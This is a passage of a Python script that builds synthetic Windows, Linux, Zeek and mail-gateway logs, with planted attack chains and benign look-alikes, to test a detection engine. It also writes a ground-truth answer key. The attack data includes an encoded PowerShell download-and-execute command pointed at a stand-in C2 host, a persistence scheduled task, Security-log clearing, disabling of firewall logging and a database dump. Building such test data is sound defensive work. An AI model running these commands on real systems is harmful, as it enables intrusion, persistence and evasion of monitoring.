            logon(dc, start + timedelta(seconds=rng.randint(1, 30)), user, 3, d["ip"])
        logon("FS-01", start + timedelta(minutes=rng.randint(2, 40)), user, 3, d["ip"])
        if rng.random() < 0.2:                                        # single wrong password on the DC: harmless
            logon("srv-auth-01", rt(day, 9, 16), user, 3, d["ip"], ok=False)
        if rng.random() < 0.3:                                        # another PC's NetBIOS broadcast, dropped
            peer = rng.choice(WS)
            if peer is not d:
                L.wfw(h, rt(day, 8, 17), "DROP", "UDP", peer["ip"], d["ip"], 137, 137, "RECEIVE")

    for srv in ("srv-auth-01", "DC-02", "FS-01", "WSUS-01", "PRINT-01", "JUMP-01"):   # ---------------- Windows servers
        for _ in range(24):
            logon(srv, rt(day), "SYSTEM", 5)
            proc_start(srv, rt(day), "C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe", "NT AUTHORITY\\SYSTEM",
                       "C:\\Windows\\System32\\svchost.exe", security_too=False)
        if srv != "JUMP-01":
            conn("JUMP-01", srv, 3389, at(day, 11, rng.randint(0, 50)), user="BASE\\adm.win")
            logon(srv, at(day, 11, 55), "adm.win", 10, IP["JUMP-01"])
            L.win(srv, at(day, 11, 55, 1), 4672, {"SubjectUserName": "adm.win"})

    for d in LNX:                                                    # ---------------- Ubuntu servers
        h = d["host"]
        for hr in range(24):
            L.lx(h, "auth.log", at(day, hr, 17, 1), "CRON[2101]", "pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)")
            L.lx(h, "auth.log", at(day, hr, 17, 2), "CRON[2101]", "pam_unix(cron:session): session closed for user root")
        conn("JUMP-01", h, 22, at(day, 11, 20, rng.randint(0, 59)), user="BASE\\adm.win")
        L.lx(h, "auth.log", at(day, 11, 21), "sshd[3011]", f"Accepted publickey for adm.ops from {IP['JUMP-01']} port 52211 ssh2: ED25519 SHA256:adm")
        L.lx(h, "auth.log", at(day, 11, 22), "sudo", "adm.ops : TTY=pts/0 ; PWD=/home/adm.ops ; USER=root ; COMMAND=/usr/bin/systemctl status --no-pager")
        for svc, hh in (("logrotate", 0.02), ("man-db", 0.03), ("apt-daily", 6.3), ("apt-daily-upgrade", 6.7), ("sysstat-collect", 12.0)):
            L.lx(h, "syslog", at(day, hh), "systemd[1]", f"Started {svc}.service - {svc}.")
        if h != "srv-dns-01":
            conn(h, "srv-dns-01", 53, rt(day), "UDP")
        for m in range(0, 1440, 5):                                  # monitoring polls every server
            if h != "srv-mon-01":
                conn("srv-mon-01", h, 9100, day + timedelta(minutes=m, seconds=rng.uniform(0, 50)))
        if h != "srv-backup-02":                                     # nightly backup (approved, daily)
            t = at(day, 2, 30) + timedelta(minutes=rng.randint(0, 25))
            L.lx(h, "syslog", t, "systemd[1]", "Started backup-rsync.service - Nightly backup.", label="backup")
            for k in range(3):
                conn(h, "srv-backup-02", 873, t + timedelta(seconds=20 * k), label="backup")
        prng = random.Random(h)                                      # internal probes that the firewall blocks: an old
        for _ in range(prng.randint(1, 3)):                          # inventory tool on the same PCs, same ports, every day
            conn(prng.choice(WS)["host"], h, prng.choice([23, 3306, 5900]), rt(day, 8, 17), state="S0")
    for gate, ctrl in (("gate-01", "srv-gate-ctrl-01"), ("gate-02", "srv-gate-ctrl-01"), ("gate-03", "srv-gate-ctrl-02"), ("gate-04", "srv-gate-ctrl-02")):
        for m in range(0, 1440, 2):                                  # gate controllers poll their server (Modbus/TCP 502)
            conn(gate, ctrl, 502, day + timedelta(minutes=m, seconds=rng.uniform(0, 59)))
    for m in range(0, 1440, 10):                                     # C2 application uses the logistics database
        conn("srv-c2-app", "srv-logistics-db", 5432, day + timedelta(minutes=m, seconds=rng.uniform(0, 59)))
    for _ in range(400):                                             # public visitors on the web portal
        conn(rng.choice(VISITORS), "srv-web-01", 443, rt(day, 6, 23))
    for _ in range(120):                                             # proxy fetches the internet for the workstations
        conn("srv-proxy-01", rng.choice(VISITORS), 443, rt(day, 8, 17))
    normal_mail(day)


# ======================================================================= day 2: approved maintenance and scheduled jobs
PATCH = ("CHG-2026-1122-01", at(DAY2, 1, 0), at(DAY2, 3, 0))
WEBCHG = ("CHG-2026-1122-02", at(DAY2, 14, 0), at(DAY2, 14, 30))
SCAN = ("CHG-VULNSCAN-WEEKLY", at(DAY2, 3, 30), at(DAY2, 4, 15))
EMERG = ("CHG-2026-1122-03", at(DAY2, 21, 50), at(DAY2, 23, 0))


def maintenance():
    for d in WIN:                                                    # Windows Update everywhere
        h, t = d["host"], at(DAY2, 1, 5) + timedelta(minutes=rng.randint(0, 50))
        if h != "WSUS-01":
            conn(h, "WSUS-01", 8530, t, label="patch")
        proc_start(h, t + timedelta(minutes=2), "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack\\TiWorker.exe",
                   "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack\\TiWorker.exe -Embedding", "NT AUTHORITY\\SYSTEM",
                   "C:\\Windows\\System32\\svchost.exe", label="patch")
        for k in range(3):
            L.win(h, t + timedelta(minutes=3 + k), 19, {"updateTitle": f"2026-11 Cumulative Update KB5{rng.randint(100000, 999999)}"},
                  "System", label="patch")
        L.win(h, t + timedelta(minutes=8), 7045, {"ServiceName": "Windows Update Medic Service", "AccountName": "LocalSystem",
                                                  "ImagePath": "C:\\Windows\\System32\\WaaSMedicSvc.exe"}, "System", label="patch")
        L.win(h, t + timedelta(minutes=9), 4947, {"SubjectUserName": "SYSTEM", "RuleName": "Delivery Optimization (TCP-In)"}, label="patch")
        L.win(h, t + timedelta(minutes=10), 4698, {"SubjectUserName": "SYSTEM", "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot_AC"},
              label="patch")
    for d in LNX:                                                    # apt upgrade on every Ubuntu server
        h, t = d["host"], at(DAY2, 1, 10) + timedelta(minutes=rng.randint(0, 45))
        if h != "srv-proxy-01":
            conn(h, "srv-proxy-01", 3128, t, label="patch")
        for k, (pkg, old, new) in enumerate([("openssl", "3.0.13-0ubuntu3.4", "3.0.13-0ubuntu3.5"),
                                             ("openssh-server", "1:9.6p1-3ubuntu13.5", "1:9.6p1-3ubuntu13.8"),
                                             ("systemd", "255.4-1ubuntu8.4", "255.4-1ubuntu8.6"), ("fwupd", "1.9.24-1", "1.9.27-1")]):
            L.dpkg(h, t + timedelta(seconds=30 + 20 * k), pkg, old, new, label="patch")
        L.lx(h, "syslog", t + timedelta(minutes=3), "systemd[1]", "Started ssh.service - OpenBSD Secure Shell server.", label="patch")
        L.lx(h, "syslog", t + timedelta(minutes=4), "systemd[1]", "Started fwupd-refresh.service - Refresh fwupd metadata.", label="patch")

    # approved firewall change on the web portal
    L.lx("srv-web-01", "auth.log", at(DAY2, 14, 10), "sudo", "adm.ops : TTY=pts/0 ; PWD=/home/adm.ops ; USER=root ; COMMAND=/usr/sbin/ufw allow 8443/tcp",
         label="change")

    # B3 (scheduled job, looks like discovery T1046): weekly authenticated vulnerability scan from srv-mon-01, Sunday 03:30
    t = SCAN[1]
    open_ports = {"windows": {135, 139, 445, 3389}, "srv-auth-01": {88, 389}, "DC-02": {88, 389}, "WSUS-01": {8530}, "PRINT-01": {9100},
                  "srv-web-01": {443}, "srv-mail-01": {25}, "srv-proxy-01": {3128}, "srv-dns-01": {53}, "srv-logistics-db": {5432},
                  "srv-backup-02": {873}, "srv-c2-app": {8080}, "srv-gate-ctrl-01": {502}, "srv-gate-ctrl-02": {502}}
    ports = [21, 22, 23, 25, 53, 80, 88, 135, 139, 389, 443, 445, 502, 873, 1433, 3128, 3306, 3389, 5432, 5900, 8080, 8530, 9100]
    for d in WIN + LNX:
        h = d["host"]
        if h == "srv-mon-01":
            continue
        opened = (open_ports["windows"] if d["os"] == "windows" else {22, 9100}) | open_ports.get(h, set())
        for p in ports:
            t += timedelta(milliseconds=rng.randint(150, 900))
            conn("srv-mon-01", h, p, t, label="vulnscan", state="SF" if p in opened else ("S0" if d["os"] == "windows" else "REJ"))
        t += timedelta(seconds=2)
        if d["os"] == "windows":
            logon(h, t, "svc_vulnscan", 3, IP["srv-mon-01"], label="vulnscan")
        else:
            L.lx(h, "auth.log", t, "sshd[7100]", f"Accepted publickey for svc_vulnscan from {IP['srv-mon-01']} port 50110 ssh2: ED25519 SHA256:scan",
                 label="vulnscan")
        t += timedelta(seconds=rng.randint(20, 40))

    # B2 (emergency change, night): admin installs a monitoring agent on DC-02 under ticket CHG-2026-1122-03
    w = "WS-BASE-001"
    logon(w, at(DAY2, 21, 58), "a.krasniqi", 2, label="emergency")
    conn(w, "JUMP-01", 3389, at(DAY2, 22, 1), label="emergency", user="BASE\\a.krasniqi")
    logon("JUMP-01", at(DAY2, 22, 1, 3), "adm.win", 10, IP[w], label="emergency")
    conn("JUMP-01", "DC-02", 3389, at(DAY2, 22, 4), label="emergency", user="BASE\\adm.win")
    logon("DC-02", at(DAY2, 22, 4, 2), "adm.win", 10, IP["JUMP-01"], label="emergency")
    L.win("DC-02", at(DAY2, 22, 4, 3), 4672, {"SubjectUserName": "adm.win"}, label="emergency")
    proc_start("DC-02", at(DAY2, 22, 9), "C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i \\\\FS-01\\it$\\ADHealthAgent.msi /qn",
               "adm.win", EXPLORER, label="emergency")
    L.win("DC-02", at(DAY2, 22, 10), 7045, {"ServiceName": "ADHealthAgent", "AccountName": "LocalSystem",
                                            "ImagePath": "C:\\Program Files\\AD Health\\adhealth.exe"}, "System", label="emergency")
    L.win("DC-02", at(DAY2, 22, 11), 4947, {"SubjectUserName": "adm.win", "RuleName": "AD Health Agent (TCP-In)"}, label="emergency")
    L.win("DC-02", at(DAY2, 22, 31), 4634, {"TargetUserName": "adm.win", "LogonType": "10"}, label="emergency")


# ======================================================================= day 2: attacks and look-alikes
def attacks():
    ws, gate = "WS-BASE-014", "srv-gate-ctrl-01"
    # A1: the brief's night-shift chain, inside the patch window
    for k in range(4):
        t = at(DAY2, 1, 41 + k // 2, 10 + 25 * (k % 2))
        conn(ATTACKER, ws, 3389, t - timedelta(seconds=2), label="A1:entry")
        logon(ws, t, "op_night_01", 10, ATTACKER, ok=False, label="A1:entry")
    conn(ATTACKER, ws, 3389, at(DAY2, 1, 45, 1), label="A1:entry")
    logon(ws, at(DAY2, 1, 45, 3), "op_night_01", 10, ATTACKER, label="A1:entry")
    proc_start(ws, at(DAY2, 1, 47), "C:\\Windows\\System32\\cmd.exe", "\"C:\\Windows\\system32\\cmd.exe\"", "op_night_01", EXPLORER,
               label="A1:execution")
    proc_start(ws, at(DAY2, 1, 51, 50), "C:\\Windows\\System32\\OpenSSH\\ssh.exe", f"ssh svc_ops_night@{IP[gate]}", "op_night_01",
               "C:\\Windows\\System32\\cmd.exe", label="A1:lateral")
    conn(ws, gate, 22, at(DAY2, 1, 52), label="A1:lateral", user="BASE\\op_night_01")
    L.lx(gate, "auth.log", at(DAY2, 1, 53), "sshd[4410]", f"Accepted password for svc_ops_night from {IP[ws]} port 53122 ssh2", "A1:lateral")
    sudo = "svc_ops_night : TTY=pts/1 ; PWD=/home/svc_ops_night ; USER=root ; COMMAND="
    L.lx(gate, "auth.log", at(DAY2, 1, 58), "sudo", sudo + "/usr/bin/systemctl enable --now gate-sync.service", "A1:persistence")
    L.lx(gate, "syslog", at(DAY2, 1, 58, 2), "systemd[1]", "Started gate-sync.service - Gate sync agent.", "A1:persistence")
    L.lx(gate, "auth.log", at(DAY2, 2, 1), "sudo", sudo + "/usr/sbin/ufw allow 4444/tcp", "A1:defense-evasion")
    L.lx(gate, "auth.log", at(DAY2, 2, 3), "sudo", sudo + "/usr/sbin/useradd -m -s /bin/bash maint-svc", "A1:persistence")
    L.lx(gate, "auth.log", at(DAY2, 2, 3), "useradd[4502]", "new user: name=maint-svc, UID=1003, GID=1003, home=/home/maint-svc, shell=/bin/bash",
         "A1:persistence")
    L.lx(gate, "auth.log", at(DAY2, 2, 5), "sudo", sudo + "/usr/sbin/ufw logging off", "A1:defense-evasion")
    for k in range(6):                                               # traffic to the new port: only Zeek + the workstation see it now
        conn(ws, gate, 4444, at(DAY2, 2, 6 + 5 * k, rng.randint(0, 50)), label="A1:c2", image="C:\\Windows\\System32\\OpenSSH\\ssh.exe",
             user="BASE\\op_night_01")
    proc_start(ws, at(DAY2, 2, 11, 58), "C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe cl Security", "op_night_01",
               "C:\\Windows\\System32\\cmd.exe", label="A1:defense-evasion")
    L.win(ws, at(DAY2, 2, 12), 1102, {"SubjectUserName": "op_night_01"}, label="A1:defense-evasion")
    # silent source: the gate-control server's firewall log stops (logging switched off) until an admin turns it back on
    L.files[f"{gate}_ufw.log"] = [r for r in L.files[f"{gate}_ufw.log"] if not (at(DAY2, 2, 5) <= r[0] < at(DAY2, 4, 30))]

    # A2: password spraying from outside against the web portal's SSH (no success)
    for k in range(30):
        t = at(DAY2, 10, 20) + timedelta(seconds=8 * k)
        conn(SPRAYER, "srv-web-01", 22, t, label="A2")
        L.lx("srv-web-01", "auth.log", t + timedelta(seconds=1), "sshd[5120]",
             f"Failed password for invalid user {rng.choice(['admin', 'root', 'test', 'oracle', 'ubuntu', 'guest'])} from {SPRAYER} port {40000 + k} ssh2", "A2")

    # A3: a device that is not in the inventory logs on to the logistics database and dumps it
    db = "srv-logistics-db"
    conn(ROGUE, db, 22, at(DAY2, 15, 30), label="A3")
    L.lx(db, "auth.log", at(DAY2, 15, 30, 4), "sshd[6011]", f"Accepted password for dbadmin from {ROGUE} port 51515 ssh2", "A3")
    L.lx(db, "auth.log", at(DAY2, 15, 34), "sudo", "dbadmin : TTY=pts/2 ; PWD=/home/dbadmin ; USER=postgres ; COMMAND=/usr/bin/pg_dump logistics", "A3")
    for k in range(3):
        conn(ROGUE, db, 22, at(DAY2, 15, 36 + k), label="A3")

    # A4: phishing -> macro -> PowerShell -> payload -> scheduled task -> beaconing straight to the internet (bypassing the proxy)
    pw, user = "WS-BASE-007", "h.rexhepi"
    doc_name = "Gate_Access_Schedule_Nov.docm"
    conn(PHISH_MTA, "srv-mail-01", 25, at(DAY2, 13, 2, 9), label="A4:delivery")
    L.mail(at(DAY2, 13, 2, 11), "inbound", PHISH_MTA, "mail.base-helpdesk.example", "it-support@base-helpdesk.example", [mail_of(user)],
           "Updated gate access schedule - action required", verdict="suspicious", action="delivered", score=4.2, spf="softfail",
           dkim="none", dmarc="none", attachments=[{"name": doc_name, "type": "application/vnd.ms-word.document.macroEnabled.12",
                                                    "sha256": sha("phish-docm")}], label="A4:delivery")
    conn(pw, "srv-mail-01", 993, at(DAY2, 13, 9, 40), label="A4:delivery")
    cache = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X7K2QF0M\\{doc_name}"
    proc_start(pw, at(DAY2, 13, 14, 30), OFFICE + "WINWORD.EXE", f"\"{OFFICE}WINWORD.EXE\" /n \"{cache}\"", user, OFFICE + "OUTLOOK.EXE",
               label="A4:execution")
    enc = base64.b64encode(f"IEX (New-Object Net.WebClient).DownloadString('https://{C2_SERVER}/a')".encode("utf-16-le")).decode()
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    proc_start(pw, at(DAY2, 13, 14, 52), ps, f"powershell.exe -nop -w hidden -enc {enc}", user, OFFICE + "WINWORD.EXE",
               f"\"{OFFICE}WINWORD.EXE\" /n \"{cache}\"", label="A4:execution")
    conn(pw, C2_SERVER, 443, at(DAY2, 13, 14, 55), label="A4:c2", image=ps, user=f"BASE\\{user}")
    payload = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\updsvc.exe"
    L.sysmon(pw, at(DAY2, 13, 15, 20), 11, {"ProcessGuid": guid(), "ProcessId": pid(), "Image": ps, "TargetFilename": payload,
                                            "User": f"BASE\\{user}"}, "A4:execution")
    proc_start(pw, at(DAY2, 13, 15, 40), "C:\\Windows\\System32\\schtasks.exe",
               f"schtasks.exe /create /sc minute /mo 5 /tn \"\\Microsoft\\Windows\\UpdSvc\" /tr \"{payload}\" /f", user, ps,
               label="A4:persistence")
    L.win(pw, at(DAY2, 13, 15, 41), 4698, {"SubjectUserName": user, "TaskName": "\\Microsoft\\Windows\\UpdSvc", "TaskContent": payload},
          label="A4:persistence")
    t = at(DAY2, 13, 20)
    while t < at(DAY2, 16, 45):                                      # beacon every ~5 min until the user logs off
        proc_start(pw, t, payload, f"\"{payload}\"", user, "C:\\Windows\\System32\\svchost.exe", label="A4:c2", security_too=False)
        conn(pw, C2_SERVER, 443, t + timedelta(seconds=1), label="A4:c2", image=payload, user=f"BASE\\{user}")
        t += timedelta(seconds=300 + rng.randint(-20, 20))

    # B1 (harmless look-alike): a user back from leave mistypes the password 6 times on the file server, then gets it right
    u, src = "g.kelmendi", IP["WS-BASE-006"]
    for k in range(6):
        logon("FS-01", at(DAY2, 9, 5, 5 * k), u, 3, src, ok=False, label="B1")
    logon("FS-01", at(DAY2, 9, 5, 40), u, 3, src, label="B1")

    # B4 (harmless look-alike): a malware mail campaign that the gateway QUARANTINED; nobody received it
    users = [d["users"][0] for d in WS]
    for k, rcpt in enumerate(rng.sample(users, 12)):
        tt = at(DAY2, 9, 40, 5 * k)
        conn(BADMAIL_MTA, "srv-mail-01", 25, tt - timedelta(seconds=2), label="B4")
        L.mail(tt, "inbound", BADMAIL_MTA, "smtp.invoices-portal.example", "billing@invoices-portal.example", [mail_of(rcpt)],
               "Invoice overdue - final notice", verdict="malware", action="quarantined", score=9.6, spf="fail", dkim="none", dmarc="fail",
               attachments=[{"name": "Invoice_4471.zip", "type": "application/zip", "sha256": sha("bad-zip")}], label="B4")


# ======================================================================= truth: what was planted, with ATT&CK
TRUTH = {
    "attacks": {
        "A1": {"title": "Night-shift chain (the brief's scenario): RDP brute force on WS-BASE-014 -> SSH to srv-gate-ctrl-01 -> "
                        "new service, firewall opened, new account, firewall logging off, Windows log cleared",
               "hosts": ["WS-BASE-014", "srv-gate-ctrl-01"], "accounts": ["op_night_01", "svc_ops_night", "maint-svc"], "ips": [ATTACKER],
               "start": at(DAY2, 1, 41).isoformat(), "end": at(DAY2, 2, 31).isoformat(),
               "techniques": ["T1110.001", "T1078", "T1059.003", "T1021.004", "T1543.002", "T1562.004", "T1136.001", "T1571", "T1070.001"],
               "sources": ["windows_events", "windows_firewall", "windows_sysmon", "linux_auth", "linux_syslog", "linux_ufw", "zeek_conn"]},
        "A2": {"title": "Password spraying from 198.51.100.23 against srv-web-01 SSH, no success", "hosts": ["srv-web-01"],
               "ips": [SPRAYER], "start": at(DAY2, 10, 20).isoformat(), "end": at(DAY2, 10, 24).isoformat(),
               "techniques": ["T1110.003"], "sources": ["linux_auth", "linux_ufw", "zeek_conn"]},
        "A3": {"title": "Unknown device 10.24.99.50 logs on to srv-logistics-db as dbadmin and dumps the database",
               "hosts": ["srv-logistics-db"], "accounts": ["dbadmin"], "ips": [ROGUE],
               "start": at(DAY2, 15, 30).isoformat(), "end": at(DAY2, 15, 39).isoformat(),
               "techniques": ["T1200", "T1078", "T1005"], "sources": ["linux_auth", "linux_ufw", "zeek_conn"]},
        "A4": {"title": "Phishing mail with macro document -> PowerShell -> payload -> scheduled task -> beaconing to 203.0.113.77:443",
               "hosts": ["WS-BASE-007", "srv-mail-01"], "accounts": ["h.rexhepi"], "ips": [PHISH_MTA, C2_SERVER],
               "start": at(DAY2, 13, 2).isoformat(), "end": at(DAY2, 16, 45).isoformat(),
               "techniques": ["T1566.001", "T1204.002", "T1059.001", "T1105", "T1053.005", "T1071.001", "T1573"],
               "sources": ["mail_gateway", "windows_sysmon", "windows_events", "windows_firewall", "zeek_conn"]}},
    "lookalikes": {
        "B1": "g.kelmendi mistypes the password 6 times on FS-01, then logs on (back from leave)",
        "B2": "Night admin RDP chain WS-BASE-001 -> JUMP-01 -> DC-02, new service + firewall rule, under emergency ticket CHG-2026-1122-03",
        "B3": "Weekly authenticated vulnerability scan from srv-mon-01 over all hosts and ports (CHG-VULNSCAN-WEEKLY)",
        "B4": "Malware mail campaign to 12 users, quarantined by the gateway (nobody received it)",
        "inventory.ps1": "Daily PowerShell -ExecutionPolicy Bypass inventory script on every workstation at 10:00 (both days)"},
    "maintenance": {"patch": PATCH[0], "change": WEBCHG[0], "backup": "CHG-BACKUP-DAILY", "vulnscan": SCAN[0], "emergency": EMERG[0]},
    "silent_source": {"source": "srv-gate-ctrl-01-ufw", "from": at(DAY2, 2, 5).isoformat(), "to": at(DAY2, 4, 30).isoformat(),
                      "note": "A1 runs 'ufw logging off'; Zeek and the workstation's firewall still see the traffic to port 4444"},
    "expected": {"incidents": 4, "false_incidents_max": 0,
                 "suppressed": ["patch", "change", "backup", "vulnscan", "emergency"]},
}


# ======================================================================= write everything
NEW_KINDS = {"sysmon.jsonl", "zeek-conn.log", "mailgw.jsonl"}
LEGACY = False   # --legacy: keep the new sources out of sources.yaml (for engines without their parsers)
PARSER = {"events.jsonl": "windows_events", "pfirewall.log": "windows_firewall", "auth.log": "linux_auth", "ufw.log": "linux_ufw",
          "syslog": "linux_syslog", "dpkg.log": "linux_dpkg", "sysmon.jsonl": "windows_sysmon", "zeek-conn.log": "zeek_conn",
          "mailgw.jsonl": "mail_gateway"}
EVERY = {"events.jsonl": 240, "pfirewall.log": 60, "auth.log": 90, "ufw.log": 15, "syslog": 720, "dpkg.log": 2880,
         "sysmon.jsonl": 240, "zeek-conn.log": 5, "mailgw.jsonl": 60}


def _source_name(fname):
    host, kind = fname.split("_", 1)
    return f"{host.lower()}-{kind.split('.')[0]}"


def write():
    for d in (OUT, ECS_OUT) if WRITE_ECS else (OUT,):
        d.mkdir(parents=True, exist_ok=True)
        for f in d.glob("*"):
            if f.is_file():
                f.unlink()
    truth = {**TRUTH, "lines": {}}
    total = 0
    for fname, rows in sorted(L.files.items()):
        rows.sort(key=lambda r: r[0])
        header = ["#Version: 1.5", "#Software: Microsoft Windows Firewall", "#Time Format: Local",
                  "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path"] \
            if fname.endswith("pfirewall.log") else []
        ecs_name = fname.rsplit(".", 1)[0] + ".ecs.jsonl" if "." in fname else fname + ".ecs.jsonl"
        with open(OUT / fname, "w", encoding="utf-8", newline="\n") as fh, \
                (open(ECS_OUT / ecs_name, "w", encoding="utf-8", newline="\n") if WRITE_ECS else contextlib.nullcontext()) as fe:
            fh.write("".join(h + "\n" for h in header))
            for n, (_, text, label, doc) in enumerate(rows, len(header) + 1):
                fh.write(text + "\n")
                doc["log"]["file"]["line"] = n
                if fe:
                    fe.write(json.dumps(doc, separators=(",", ":")) + "\n")
                if label:
                    truth["lines"].setdefault(label, []).append(f"{_source_name(fname)}:{n}")
        total += len(rows)
    (OUT / "truth.json").write_text(json.dumps(truth, indent=2), encoding="utf-8")
    write_settings()
    return total


def write_settings():
    known, extra = [], []
    for f in sorted(OUT.glob("*_*")):
        if f.suffix == ".yaml":
            continue
        host, kind = f.name.split("_", 1)
        s = {"name": _source_name(f.name), "parser": PARSER[kind], "path": f.name, "host": host, "expected_every_min": EVERY[kind]}
        if kind in ("pfirewall.log", "dpkg.log"):
            s["utc_offset"] = "+01:00"
        (extra if kind in NEW_KINDS and LEGACY else known).append(s)
    assets = {"night_hours": [20, 6], "admin_ips": [IP["JUMP-01"]], "scanner_ips": [IP["srv-mon-01"]],
              "internal_nets": ["10.24.0.0/16"], "mail_domain": DOMAIN,
              "public_services": [{"host": "srv-web-01", "ports": [443]}, {"host": "srv-mail-01", "ports": [25]}],
              "assets": [{"host": d["host"], "ip": d["ip"], "os": d["os"], "role": d["role"], "criticality": d["criticality"]} for d in DEV]}
    win_hosts, lnx_hosts = [d["host"] for d in WIN], [d["host"] for d in LNX]
    maintenance_cfg = {"tickets": [
        {"id": PATCH[0], "title": "Monthly patching: Windows Update + apt", "hosts": win_hosts + lnx_hosts,
         "start": PATCH[1].isoformat(), "end": PATCH[2].isoformat(),
         "allow": [{"action": "update-installed"},
                   {"action": "service-installed", "user": ["LocalSystem", "SYSTEM"], "path|startswith": ["C:\\Windows\\", "C:\\Program Files\\"]},
                   {"action": "firewall-change", "user": ["SYSTEM"]},
                   {"action": "service-started", "service": ["ssh", "fwupd-refresh"]},
                   {"type": "network", "dst_ip": [IP["WSUS-01"], IP["srv-proxy-01"]], "dst_port": [8530, 3128]}]},
        {"id": WEBCHG[0], "title": "Open port 8443 on the web portal for the new booking page", "hosts": ["srv-web-01"],
         "start": WEBCHG[1].isoformat(), "end": WEBCHG[2].isoformat(),
         "allow": [{"action": "firewall-change", "user": ["adm.ops"], "detail|contains": ["ufw allow 8443"]}]},
        {"id": "CHG-BACKUP-DAILY", "title": "Nightly backup to srv-backup-02", "hosts": lnx_hosts, "daily": ["02:25", "03:15"],
         "allow": [{"service": ["backup-rsync"]}, {"type": "network", "dst_ip": [IP["srv-backup-02"]], "dst_port": [873]}]},
        {"id": SCAN[0], "title": "Weekly authenticated vulnerability scan (Sundays 03:30-04:15)", "hosts": win_hosts + lnx_hosts,
         "start": SCAN[1].isoformat(), "end": SCAN[2].isoformat(),
         "allow": [{"type": "network", "src_ip": [IP["srv-mon-01"]]}, {"type": "auth", "user": ["svc_vulnscan"], "src_ip": [IP["srv-mon-01"]]}]},
        {"id": EMERG[0], "title": "Emergency: install AD Health Agent on DC-02 (approved by duty officer)",
         "hosts": ["WS-BASE-001", "JUMP-01", "DC-02"], "start": EMERG[1].isoformat(), "end": EMERG[2].isoformat(),
         "allow": [{"type": "auth", "user": ["a.krasniqi", "adm.win"]},
                   {"type": "network", "dst_ip": [IP["JUMP-01"], IP["DC-02"]], "dst_port": [3389]},
                   {"action": "service-installed", "service": ["ADHealthAgent"], "path|startswith": ["C:\\Program Files\\AD Health\\"]},
                   {"action": "firewall-change", "user": ["adm.win"], "detail|contains": ["AD Health Agent"]}]}]}
    for name, obj in (("sources.yaml", {"baseline_hours": 24, "sources": known}),
                      ("sources_extra.yaml", {"note": "new log sources; add a parser/agent for each, then move them into sources.yaml",
                                              "sources": extra}),
                      ("assets.yaml", assets), ("maintenance.yaml", maintenance_cfg)):
        (OUT / name).write_text(yaml.safe_dump(obj, sort_keys=False, allow_unicode=True), encoding="utf-8")
    inv = [{k: d[k] for k in ("host", "ip", "os", "type", "role", "criticality", "users")} for d in DEV]
    (OUT.parent / "inventory.json").write_text(json.dumps({"devices": inv}, indent=2), encoding="utf-8")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Generate the synthetic 50-device base logs (local, deterministic).")
    ap.add_argument("--out", type=Path, default=ROOT, help="base folder: writes <out>/logs, <out>/logs_ecs, <out>/inventory.json")
    ap.add_argument("--no-ecs", action="store_true", help="skip the normalized ECS copy")
    ap.add_argument("--legacy", action="store_true", help="only the six original sources in sources.yaml")
    args = ap.parse_args()
    OUT, ECS_OUT, WRITE_ECS, LEGACY = args.out / "logs", args.out / "logs_ecs", not args.no_ecs, args.legacy
    for note in ALIGN_NOTES:
        print(note)
    normal_day(DAY1)
    normal_day(DAY2)
    maintenance()
    attacks()
    n = write()
    files = len([f for f in OUT.glob("*_*") if f.suffix != ".yaml"])
    print(f"{n:,} log lines in {files} files for {len(DEV)} devices -> {OUT}")
    if WRITE_ECS:
        print(f"ECS copy: {len(list(ECS_OUT.glob('*.jsonl')))} files -> {ECS_OUT}")
